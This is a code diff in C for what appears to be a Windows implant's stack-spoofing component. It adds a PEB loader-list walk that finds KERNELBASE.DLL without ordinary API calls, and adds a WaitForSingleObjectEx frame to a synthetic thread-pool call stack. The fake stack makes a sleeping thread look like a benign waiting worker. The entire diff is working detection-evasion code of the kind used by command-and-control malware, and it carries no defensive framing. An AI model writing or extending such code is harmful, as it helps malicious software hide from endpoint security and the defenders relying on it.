@@ -201,6 +201,84 @@ static PVOID FindExportByName(
 }
 
 /* ----------------------------------------------------------------
+ *  Internal: Find a module base by name via the PEB loader list.
+ * ---------------------------------------------------------------- */
+static BOOL UnicodeStringEqualsIW(
+    _In_ PUNICODE_STRING Name,
+    _In_ LPCWSTR         Target
+) {
+    ULONG NameLen   = 0;
+    ULONG TargetLen = 0;
+
+    if ( ! Name || ! Target || ! Name->Buffer ) {
+        return FALSE;
+    }
+
+    TargetLen = ( ULONG ) StringLengthW( Target );
+    NameLen   = ( ULONG ) ( Name->Length / sizeof( WCHAR ) );
+
+    if ( NameLen != TargetLen ) {
+        return FALSE;
+    }
+
+    for ( ULONG i = 0; i < NameLen; i++ )
+    {
+        WCHAR a = Name->Buffer[ i ];
+        WCHAR b = Target[ i ];
+
+        if ( a >= L'A' && a <= L'Z' ) {
+            a = ( WCHAR ) ( a + 0x20 );
+        }
+        if ( b >= L'A' && b <= L'Z' ) {
+            b = ( WCHAR ) ( b + 0x20 );
+        }
+
+        if ( a != b ) {
+            return FALSE;
+        }
+    }
+
+    return TRUE;
+}
+
+static PVOID FindModuleByName(
+    _In_ LPCWSTR ModuleName
+) {
+    PLDR_DATA_TABLE_ENTRY Ldr = NULL;
+    PLIST_ENTRY           Hdr = NULL;
+    PLIST_ENTRY           Ent = NULL;
+    PPEB                  Peb = NULL;
+
+    if ( ! ModuleName ) {
+        return NULL;
+    }
+
+    if ( ! Instance->Teb ) {
+        Instance->Teb = NtCurrentTeb();
+    }
+
+    Peb = Instance->Teb->ProcessEnvironmentBlock;
+    if ( ! Peb || ! Peb->Ldr ) {
+        return NULL;
+    }
+
+    Hdr = & Peb->Ldr->InLoadOrderModuleList;
+    Ent = Hdr->Flink;
+
+    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
+        Ldr = C_PTR( Ent );
+
+        if ( Ldr->BaseDllName.Buffer && Ldr->BaseDllName.Length ) {
+            if ( UnicodeStringEqualsIW( &Ldr->BaseDllName, ModuleName ) ) {
+                return Ldr->DllBase;
+            }
+        }
+    }
+
+    return NULL;
+}
+
+/* ----------------------------------------------------------------
  *  SynthStackInit — populate the synthetic frame descriptors.
  *
  *  We build a realistic thread-pool-style stack:
@@ -208,7 +286,8 @@ static PVOID FindExportByName(
  *  Frame 0: RtlUserThreadStart (ntdll)  — outermost frame
  *  Frame 1: BaseThreadInitThunk (kernel32) — always present
  *  Frame 2: TpReleaseCleanupGroupMembers or TpCallbackMayRunLong (ntdll)
- *  Frame 3: NtWaitForSingleObject (ntdll) — innermost (where we "sleep")
+ *  Frame 3: WaitForSingleObjectEx (kernelbase)
+ *  Frame 4: NtWaitForSingleObject (ntdll) — innermost (where we "sleep")
  *
  *  Any frame we can't resolve is skipped gracefully.
  *  Minimum 2 frames required for initialization to succeed.
@@ -216,8 +295,9 @@ static PVOID FindExportByName(
 BOOL SynthStackInit(
     _Out_ PSYNTH_STACK_CTX Ctx
 ) {
-    PVOID Ntdll    = Instance->Modules.Ntdll;
-    PVOID Kernel32 = Instance->Modules.Kernel32;
+    PVOID Ntdll      = Instance->Modules.Ntdll;
+    PVOID Kernel32   = Instance->Modules.Kernel32;
+    PVOID Kernelbase = NULL;
 
     struct {
         PVOID  Module;
@@ -231,7 +311,9 @@ BOOL SynthStackInit(
         { Kernel32, "BaseThreadInitThunk",               0x30, 0x30 },
         /* Frame 2: a thread-pool function — try several in priority order */
         { Ntdll,    "TpReleaseCleanupGroupMembers",      0x80, 0x68 },
-        /* Frame 3 (top): NtWaitForSingleObject — this is what the thread "blocks" on */
+        /* Frame 3: WaitForSingleObjectEx — kernelbase wrapper */
+        { NULL,     "WaitForSingleObjectEx",             0x60, 0x48 },
+        /* Frame 4 (top): NtWaitForSingleObject — this is what the thread "blocks" on */
         { Ntdll,    "NtWaitForSingleObject",             0x20, 0x28 },
     };
 
@@ -247,6 +329,11 @@ BOOL SynthStackInit(
     if ( ! Ctx || ! Ntdll || ! Kernel32 ) {
         return FALSE;
     }
+
+    Kernelbase = FindModuleByName( L"KERNELBASE.DLL" );
+    Candidates[ 3 ].Module = Kernelbase;
+
+    PRINTF( "SynthStack: KERNELBASE resolved at %p\n", Kernelbase )
 
     MemSet( Ctx, 0, sizeof( SYNTH_STACK_CTX ) );
 
